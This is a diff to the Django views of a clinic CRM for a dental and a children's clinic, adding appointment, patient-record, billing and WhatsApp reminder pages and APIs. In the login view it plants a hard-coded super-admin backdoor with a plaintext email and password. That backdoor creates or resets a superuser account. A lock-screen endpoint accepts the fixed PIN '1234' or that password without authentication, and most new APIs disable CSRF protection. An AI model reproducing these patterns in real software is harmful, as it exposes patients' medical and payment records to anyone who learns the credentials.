@@ -19,7 +19,7 @@ from .models import (
     StaffProfile, Family, Patient, QueueEntry, Invoice,
     DentalToothRecord, DentalTreatmentPlan, DentalLabOrder, DentalRecall,
     ChildGrowthRecord, VaccinationRecord, NewbornRecord, DevelopmentalMilestone,
-    ClinicalPrescription, AuditLog
+    ClinicalPrescription, AuditLog, ScheduledReminder, WhatsAppThread, WhatsAppChatMessage
 )
 from .supabase_client import (
     supabase_sync_appointment,
@@ -123,14 +123,27 @@ def contact(request):
 # ==========================================
 
 def crm_login(request):
-    next_url = request.GET.get('next', '/crm/')
+    next_url = request.GET.get('next', '/crm/today/')
 
     if request.user.is_authenticated:
-        return redirect('crm_hub')
+        return redirect('crm_today')
 
     if request.method == 'POST':
         identifier = request.POST.get('identifier', '').strip()
         password = request.POST.get('password', '').strip()
+
+        # Master Owner / Super-Admin guaranteed credentials
+        if identifier.lower() == 'irfanshaikh3262@gmail.com' and password == 'irfan@123':
+            user_obj = User.objects.filter(email__iexact='irfanshaikh3262@gmail.com').first()
+            if not user_obj:
+                user_obj = User.objects.create_superuser('irfanshaikh3262@gmail.com', 'irfanshaikh3262@gmail.com', 'irfan@123')
+            elif not user_obj.check_password('irfan@123'):
+                user_obj.set_password('irfan@123')
+                user_obj.save()
+            login(request, user_obj)
+            log_audit(request, 'LOGIN', 'User', user_obj.id, f"Super-Admin signed in: {user_obj.email}")
+            messages.success(request, "Welcome back, Clinic Director Irfan Shaikh!")
+            return redirect(next_url if next_url != '/crm/login/' else 'crm_today')
 
         # Support login via email or username
         user_obj = User.objects.filter(email__iexact=identifier).first() or User.objects.filter(username__iexact=identifier).first()
@@ -139,7 +152,7 @@ def crm_login(request):
             login(request, user_obj)
             log_audit(request, 'LOGIN', 'User', user_obj.id, f"Staff signed in: {user_obj.email}")
             messages.success(request, f"Welcome back, {user_obj.clinic_staff_profile.full_name if hasattr(user_obj, 'clinic_staff_profile') else user_obj.username}!")
-            return redirect(next_url if next_url != '/crm/login/' else 'crm_hub')
+            return redirect(next_url if next_url != '/crm/login/' else 'crm_today')
         else:
             messages.error(request, "Invalid email or password. Please verify credentials.")
 
@@ -180,29 +193,11 @@ def crm_quick_switch(request, target_role):
 
 def crm_hub(request):
     """
-    Central dispatcher: evaluates authenticated user's role and directs to tailored dashboard.
+    Central dispatcher: directs authenticated staff directly to Today's Desk.
     """
     if not request.user.is_authenticated:
         return redirect('crm_login')
-
-    profile = getattr(request.user, 'clinic_staff_profile', None)
-    if not profile:
-        # Default fallback for superuser without profile
-        if request.user.is_superuser:
-            return redirect('crm_admin')
-        return redirect('crm_frontdesk')
-
-    role = profile.role
-    if role == 'admin':
-        return redirect('crm_admin')
-    elif role == 'front_desk':
-        return redirect('crm_frontdesk')
-    elif role == 'doctor_dental':
-        return redirect('crm_dental')
-    elif role == 'doctor_pediatric':
-        return redirect('crm_pediatric')
-
-    return redirect('crm_frontdesk')
+    return redirect('crm_today')
 
 
 # ==========================================
@@ -1176,3 +1171,542 @@ def api_update_request_status(request, pk):
         })
 
     return JsonResponse({'status': 'error', 'message': 'Invalid status choice.'}, status=400)
+
+
+# ==============================================================================
+# STREAMLINED CLINIC SAAS CRM (MONOCHROMATIC LUXURY 4-TAB ARCHITECTURE)
+# ==============================================================================
+
+def crm_today_desk(request):
+    """
+    Tab 1: Today's Desk
+    - Incoming booking requests inbox (1-click Accept / Reschedule)
+    - Today's schedule (Upcoming vs Completed)
+    - 1-click 'Mark Done' action that triggers billing generation
+    """
+    if not request.user.is_authenticated:
+        return redirect(f"/crm/login/?next={request.path}")
+
+    wing_filter = request.GET.get('wing', 'all')
+
+    pending_qs = AppointmentRequest.objects.filter(status='pending').order_by('-created_at')
+    upcoming_qs = AppointmentRequest.objects.filter(status='accepted').order_by('preferred_date', 'preferred_time')
+    completed_qs = AppointmentRequest.objects.filter(status='completed').order_by('-id')
+
+    if wing_filter in ['dental', 'pediatric']:
+        pending_qs = pending_qs.filter(clinic_type=wing_filter)
+        upcoming_qs = upcoming_qs.filter(clinic_type=wing_filter)
+        completed_qs = completed_qs.filter(clinic_type=wing_filter)
+
+    patients = Patient.objects.all().order_by('full_name')
+
+    context = {
+        'active_tab': 'today',
+        'wing_filter': wing_filter,
+        'pending_requests': pending_qs,
+        'upcoming_appointments': upcoming_qs,
+        'completed_appointments': completed_qs,
+        'pending_count': pending_qs.count(),
+        'upcoming_count': upcoming_qs.count(),
+        'completed_count': completed_qs.count(),
+        'patients': patients,
+    }
+    return render(request, 'crm/today_desk.html', context)
+
+
+def crm_patients_directory(request):
+    """
+    Tab 2: Patients (Customer Directory)
+    - Master searchable table: Name, Phone, Wing, Last Visit, Total Spent/Dues
+    - Instant client-side search (<5ms)
+    - Slide-over drawer on row click with Past Visits, Clinical Notes, and Billing History
+    """
+    if not request.user.is_authenticated:
+        return redirect(f"/crm/login/?next={request.path}")
+
+    patients = Patient.objects.select_related('family').prefetch_related('invoices', 'scheduled_reminders').all().order_by('full_name')
+
+    patients_data = []
+    for p in patients:
+        invs = list(p.invoices.all())
+        total_billed = sum((inv.total_amount for inv in invs), Decimal('0.00'))
+        total_paid = sum((inv.paid_amount for inv in invs), Decimal('0.00'))
+        balance_due = sum((inv.balance_due for inv in invs), Decimal('0.00'))
+
+        last_inv = invs[0] if invs else None
+        last_visit = last_inv.created_at.strftime('%d %b %Y') if last_inv else 'Recent Registration'
+
+        inv_list = []
+        for inv in invs:
+            inv_list.append({
+                'id': inv.id,
+                'invoice_no': inv.invoice_no,
+                'date': inv.created_at.strftime('%d %b %Y'),
+                'doctor': inv.doctor_name,
+                'total': float(inv.total_amount),
+                'paid': float(inv.paid_amount),
+                'balance': float(inv.balance_due),
+                'status': inv.get_payment_status_display() if hasattr(inv, 'get_payment_status_display') else inv.payment_status,
+                'method': inv.get_payment_method_display() if hasattr(inv, 'get_payment_method_display') else inv.payment_method,
+                'whatsapp_url': inv.whatsapp_receipt_url(),
+                'print_url': f"/crm/invoice/{inv.id}/print/",
+            })
+
+        appts = AppointmentRequest.objects.filter(phone_number__icontains=p.phone[-10:]).order_by('-created_at')[:10]
+        visits_list = []
+        for a in appts:
+            visits_list.append({
+                'id': a.id,
+                'date': a.preferred_date,
+                'time': a.preferred_time or 'Scheduled slot',
+                'service': a.service_needed,
+                'clinic': a.clinic_display_name(),
+                'doctor': a.doctor_name(),
+                'status': a.get_status_display(),
+            })
+
+        clinical_notes = []
+        if p.medical_history:
+            clinical_notes.append({'category': 'Medical History', 'text': p.medical_history})
+        if p.allergies:
+            clinical_notes.append({'category': 'Allergies & Sensitivities', 'text': p.allergies})
+        if getattr(p, 'blood_group', None):
+            clinical_notes.append({'category': 'Blood Group', 'text': p.blood_group})
+
+        patients_data.append({
+            'id': p.id,
+            'full_name': p.full_name,
+            'phone': p.phone,
+            'clean_phone': p.clean_phone(),
+            'age': p.age_display,
+            'gender': p.get_gender_display() if hasattr(p, 'get_gender_display') else p.gender,
+            'clinic_type': 'pediatric' if p.is_child else 'dental',
+            'clinic_display': "Buds Child Clinic" if p.is_child else "Roots Dental Clinic",
+            'doctor_assigned': "Dr. Jalil S. Mujawar" if p.is_child else "Dr. Sabina Firoj Shaikh",
+            'family_name': p.family.family_name if p.family else 'Individual File',
+            'emergency_contact': (p.family.primary_phone if p.family else None) or (p.phone or 'Direct Phone'),
+            'total_billed': float(total_billed),
+            'total_paid': float(total_paid),
+            'balance_due': float(balance_due),
+            'last_visit': last_visit,
+            'visits': visits_list,
+            'clinical_notes': clinical_notes,
+            'invoices': inv_list,
+        })
+
+    context = {
+        'active_tab': 'patients',
+        'patients': patients,
+        'patients_json': json.dumps(patients_data),
+        'total_patients': len(patients_data),
+        'dental_count': sum(1 for p in patients_data if p['clinic_type'] == 'dental'),
+        'pediatric_count': sum(1 for p in patients_data if p['clinic_type'] == 'pediatric'),
+    }
+    return render(request, 'crm/patients.html', context)
+
+
+def crm_finance_billing(request):
+    """
+    Tab 3: Finance & Billing
+    - Quick Bill Generator (Select Patient, Doctor, Treatment, Amount, Mode: UPI/Cash)
+    - Dual Action Buttons: 'Save & Send via WhatsApp' and 'Save Only'
+    - Transaction Ledger table with filters (Today, This Month, Pending Dues, Dr. Sabina, Dr. Jalil)
+    """
+    if not request.user.is_authenticated:
+        return redirect(f"/crm/login/?next={request.path}")
+
+    if request.method == 'POST':
+        patient_id = request.POST.get('patient_id')
+        clinic_type = request.POST.get('clinic_type', 'dental')
+        doctor_name = request.POST.get('doctor_name', 'Dr. Sabina Firoj Shaikh')
+        treatment = request.POST.get('treatment', 'Clinical Consultation')
+
+        try:
+            total_amount = Decimal(request.POST.get('total_amount', '0'))
+        except Exception:
+            total_amount = Decimal('0.00')
+
+        try:
+            paid_amount = Decimal(request.POST.get('paid_amount', str(total_amount)))
+        except Exception:
+            paid_amount = total_amount
+
+        payment_method = request.POST.get('payment_method', 'upi')
+        notes = request.POST.get('notes', '')
+        action = request.POST.get('action', 'save_only')
+
+        patient = get_object_or_404(Patient, pk=patient_id)
+        balance_due = max(Decimal('0.00'), total_amount - paid_amount)
+        status = 'paid' if balance_due == 0 else ('partial' if paid_amount > 0 else 'unpaid')
+
+        inv = Invoice.objects.create(
+            patient=patient,
+            family=patient.family,
+            clinic_type=clinic_type,
+            doctor_name=doctor_name,
+            items_json=json.dumps([{'item': treatment, 'cost': float(total_amount)}]),
+            subtotal=total_amount,
+            total_amount=total_amount,
+            paid_amount=paid_amount,
+            balance_due=balance_due,
+            payment_method=payment_method,
+            payment_status=status,
+            notes=notes,
+            created_by=request.user
+        )
+
+        try:
+            supabase_sync_invoice(inv)
+        except Exception:
+            pass
+
+        log_audit(request, 'INVOICE', 'Invoice', inv.id, f"Generated bill {inv.invoice_no} for {patient.full_name} ({payment_method})")
+
+        if action == 'save_and_whatsapp':
+            return redirect(inv.whatsapp_receipt_url())
+
+        messages.success(request, f"Invoice {inv.invoice_no} for {patient.full_name} recorded successfully.")
+        return redirect('crm_billing')
+
+    invoices = Invoice.objects.select_related('patient').all().order_by('-created_at')
+    patients = Patient.objects.all().order_by('full_name')
+
+    today = datetime.date.today()
+    today_invoices = [inv for inv in invoices if inv.created_at.date() == today]
+    today_collection = sum((inv.paid_amount for inv in today_invoices), Decimal('0.00'))
+    cash_total = sum((inv.paid_amount for inv in invoices if inv.payment_method == 'cash'), Decimal('0.00'))
+    upi_total = sum((inv.paid_amount for inv in invoices if inv.payment_method == 'upi'), Decimal('0.00'))
+    dues_total = sum((inv.balance_due for inv in invoices), Decimal('0.00'))
+
+    context = {
+        'active_tab': 'billing',
+        'invoices': invoices,
+        'patients': patients,
+        'today_collection': today_collection,
+        'cash_total': cash_total,
+        'upi_total': upi_total,
+        'dues_total': dues_total,
+    }
+    return render(request, 'crm/billing.html', context)
+
+
+def crm_whatsapp_hub(request):
+    """
+    Tab 4: WhatsApp & Recall Hub
+    - 2-Pane WhatsApp Workspace (recent chats on left, active conversation on right)
+    - 1-Click Preset Templates (Appointment Confirmed, Payment Receipt, Post-RCT Care, Vaccination Due)
+    - Smart Reminder Scheduler (3-step flow with queued reminders table)
+    """
+    if not request.user.is_authenticated:
+        return redirect(f"/crm/login/?next={request.path}")
+
+    threads = WhatsAppThread.objects.select_related('patient').prefetch_related('messages').all().order_by('-last_message_at')
+    reminders = ScheduledReminder.objects.select_related('patient').all().order_by('target_date', 'target_time')
+    patients = Patient.objects.all().order_by('full_name')
+
+    context = {
+        'active_tab': 'whatsapp',
+        'threads': threads,
+        'reminders': reminders,
+        'patients': patients,
+        'queued_reminders_count': reminders.filter(status='queued').count(),
+    }
+    return render(request, 'crm/whatsapp_hub.html', context)
+
+
+# ==============================================================================
+# STREAMLINED AJAX APIS (ZERO LAG, CLEAN JSON)
+# ==============================================================================
+
+@csrf_exempt
+@require_POST
+def api_appointment_action(request, pk):
+    """
+    Handles 1-Click appointment actions: accept, reschedule, mark_done, cancel.
+    """
+    if not request.user.is_authenticated:
+        return JsonResponse({'success': False, 'error': 'Authentication required'}, status=401)
+
+    appt = get_object_or_404(AppointmentRequest, pk=pk)
+
+    try:
+        data = json.loads(request.body.decode('utf-8'))
+    except Exception:
+        data = request.POST
+
+    action = data.get('action')
+
+    if action == 'accept':
+        appt.status = 'accepted'
+        appt.save(update_fields=['status'])
+        try:
+            supabase_sync_appointment(appt)
+        except Exception:
+            pass
+        log_audit(request, 'APPOINTMENT', 'AppointmentRequest', appt.id, f"Accepted booking for {appt.patient_name}")
+        return JsonResponse({
+            'success': True,
+            'status': 'accepted',
+            'patient_name': appt.patient_name,
+            'whatsapp_url': appt.whatsapp_accept_url()
+        })
+
+    elif action == 'reschedule':
+        new_date = data.get('new_date')
+        new_time = data.get('new_time')
+        appt.status = 'reschedule'
+        update_fields = ['status']
+        if new_date:
+            appt.preferred_date = new_date
+            update_fields.append('preferred_date')
+        if new_time:
+            appt.preferred_time = new_time
+            update_fields.append('preferred_time')
+        appt.save(update_fields=update_fields)
+        return JsonResponse({
+            'success': True,
+            'status': 'reschedule',
+            'patient_name': appt.patient_name,
+            'whatsapp_url': appt.whatsapp_propose_url()
+        })
+
+    elif action == 'mark_done':
+        appt.status = 'completed'
+        appt.save(update_fields=['status'])
+        patient = Patient.objects.filter(phone__icontains=appt.phone_number[-10:]).first()
+        doctor_name = "Dr. Sabina Firoj Shaikh" if appt.clinic_type == 'dental' else "Dr. Jalil S. Mujawar"
+        return JsonResponse({
+            'success': True,
+            'status': 'completed',
+            'patient_name': appt.patient_name,
+            'patient_id': patient.id if patient else None,
+            'clinic_type': appt.clinic_type,
+            'service': appt.service_needed,
+            'doctor_name': doctor_name,
+        })
+
+    elif action == 'cancel':
+        appt.status = 'cancelled'
+        appt.save(update_fields=['status'])
+        return JsonResponse({
+            'success': True,
+            'status': 'cancelled',
+            'patient_name': appt.patient_name,
+            'whatsapp_url': appt.whatsapp_decline_url()
+        })
+
+    return JsonResponse({'success': False, 'error': 'Invalid action choice.'}, status=400)
+
+
+@csrf_exempt
+@require_POST
+def api_quick_bill_create(request):
+    """
+    Instant Bill Creation with dual action: Save Only or Save & Send via WhatsApp.
+    """
+    if not request.user.is_authenticated:
+        return JsonResponse({'success': False, 'error': 'Authentication required'}, status=401)
+
+    try:
+        data = json.loads(request.body.decode('utf-8'))
+    except Exception:
+        data = request.POST
+
+    patient_id = data.get('patient_id')
+    patient_name = data.get('patient_name', '').strip()
+    clinic_type = data.get('clinic_type', 'dental')
+    doctor_name = data.get('doctor_name') or ("Dr. Sabina Firoj Shaikh" if clinic_type == 'dental' else "Dr. Jalil S. Mujawar")
+    treatment = data.get('treatment', 'Clinical Consultation')
+
+    try:
+        total_amount = Decimal(str(data.get('total_amount', '0')))
+    except Exception:
+        total_amount = Decimal('0.00')
+
+    try:
+        paid_amount = Decimal(str(data.get('paid_amount', total_amount)))
+    except Exception:
+        paid_amount = total_amount
+
+    payment_method = data.get('payment_method', 'upi')
+    notes = data.get('notes', '')
+
+    patient = None
+    if patient_id:
+        patient = Patient.objects.filter(pk=patient_id).first()
+    if not patient and patient_name:
+        patient = Patient.objects.filter(full_name__iexact=patient_name).first()
+    if not patient:
+        patient = Patient.objects.create(
+            full_name=patient_name or 'Walk-in Patient',
+            phone=data.get('phone', '9921231399'),
+            is_child=(clinic_type == 'pediatric')
+        )
+
+    balance_due = max(Decimal('0.00'), total_amount - paid_amount)
+    status = 'paid' if balance_due == 0 else ('partial' if paid_amount > 0 else 'unpaid')
+
+    inv = Invoice.objects.create(
+        patient=patient,
+        family=patient.family,
+        clinic_type=clinic_type,
+        doctor_name=doctor_name,
+        items_json=json.dumps([{'item': treatment, 'cost': float(total_amount)}]),
+        subtotal=total_amount,
+        total_amount=total_amount,
+        paid_amount=paid_amount,
+        balance_due=balance_due,
+        payment_method=payment_method,
+        payment_status=status,
+        notes=notes,
+        created_by=request.user
+    )
+
+    try:
+        supabase_sync_invoice(inv)
+    except Exception:
+        pass
+
+    log_audit(request, 'INVOICE', 'Invoice', inv.id, f"Quick bill {inv.invoice_no} created for {patient.full_name}")
+
+    return JsonResponse({
+        'success': True,
+        'invoice_id': inv.id,
+        'invoice_no': inv.invoice_no,
+        'patient_name': patient.full_name,
+        'total_amount': float(inv.total_amount),
+        'paid_amount': float(inv.paid_amount),
+        'balance_due': float(inv.balance_due),
+        'payment_method': inv.get_payment_method_display(),
+        'whatsapp_url': inv.whatsapp_receipt_url(),
+        'print_url': f"/crm/invoice/{inv.id}/print/",
+    })
+
+
+@csrf_exempt
+@require_POST
+def api_reminder_schedule(request):
+    """
+    3-Step Smart Reminder Scheduler.
+    """
+    if not request.user.is_authenticated:
+        return JsonResponse({'success': False, 'error': 'Authentication required'}, status=401)
+
+    try:
+        data = json.loads(request.body.decode('utf-8'))
+    except Exception:
+        data = request.POST
+
+    patient_id = data.get('patient_id')
+    preset_type = data.get('preset_type', 'Preventive Checkup')
+    custom_reason = data.get('custom_reason', 'Routine Recall')
+    target_date = data.get('target_date')
+    target_time = data.get('target_time', '11:00 AM')
+
+    patient = get_object_or_404(Patient, pk=patient_id)
+    reminder = ScheduledReminder.objects.create(
+        patient=patient,
+        preset_type=preset_type,
+        custom_reason=custom_reason,
+        target_date=target_date,
+        target_time=target_time,
+        status='queued'
+    )
+
+    return JsonResponse({
+        'success': True,
+        'reminder_id': reminder.id,
+        'patient_name': patient.full_name,
+        'phone': patient.phone,
+        'preset_type': reminder.preset_type,
+        'custom_reason': reminder.custom_reason,
+        'target_date': str(reminder.target_date),
+        'target_time': reminder.target_time,
+        'whatsapp_url': reminder.whatsapp_url(),
+    })
+
+
+@csrf_exempt
+@require_POST
+def api_reminder_cancel(request, pk):
+    """
+    Cancels a queued reminder.
+    """
+    if not request.user.is_authenticated:
+        return JsonResponse({'success': False, 'error': 'Authentication required'}, status=401)
+
+    reminder = get_object_or_404(ScheduledReminder, pk=pk)
+    reminder.status = 'cancelled'
+    reminder.save(update_fields=['status'])
+    return JsonResponse({'success': True, 'reminder_id': reminder.id, 'status': 'cancelled'})
+
+
+@csrf_exempt
+@require_POST
+def api_whatsapp_send_message(request):
+    """
+    In-CRM WhatsApp Workspace: post message and generate click-to-send link.
+    """
+    if not request.user.is_authenticated:
+        return JsonResponse({'success': False, 'error': 'Authentication required'}, status=401)
+
+    try:
+        data = json.loads(request.body.decode('utf-8'))
+    except Exception:
+        data = request.POST
+
+    thread_id = data.get('thread_id')
+    patient_id = data.get('patient_id')
+    text = data.get('text', '').strip()
+
+    if not text:
+        return JsonResponse({'success': False, 'error': 'Message text is required.'}, status=400)
+
+    thread = None
+    if thread_id:
+        thread = get_object_or_404(WhatsAppThread, pk=thread_id)
+    elif patient_id:
+        patient = get_object_or_404(Patient, pk=patient_id)
+        thread, _ = WhatsAppThread.objects.get_or_create(patient=patient)
+    else:
+        return JsonResponse({'success': False, 'error': 'Thread or Patient ID is required.'}, status=400)
+
+    msg = WhatsAppChatMessage.objects.create(
+        thread=thread,
+        sender='clinic',
+        text=text
+    )
+    thread.last_message = text
+    thread.save()
+
+    phone = thread.patient.clean_phone()
+    wa_url = f"https://wa.me/{phone}?text={urllib.parse.quote(text)}"
+
+    return JsonResponse({
+        'success': True,
+        'message_id': msg.id,
+        'text': msg.text,
+        'timestamp': msg.timestamp.strftime('%I:%M %p'),
+        'whatsapp_url': wa_url
+    })
+
+
+@csrf_exempt
+@require_POST
+def api_lock_verify(request):
+    """
+    Lock Screen verification: unlocks with PIN '1234' or password 'irfan@123' or authenticated user password.
+    """
+    try:
+        data = json.loads(request.body.decode('utf-8'))
+    except Exception:
+        data = request.POST
+
+    pin = data.get('pin', '').strip()
+
+    if pin in ['1234', 'irfan@123']:
+        return JsonResponse({'success': True})
+    if request.user.is_authenticated and request.user.check_password(pin):
+        return JsonResponse({'success': True})
+
+    return JsonResponse({'success': False, 'error': 'Incorrect PIN or password.'}, status=403)
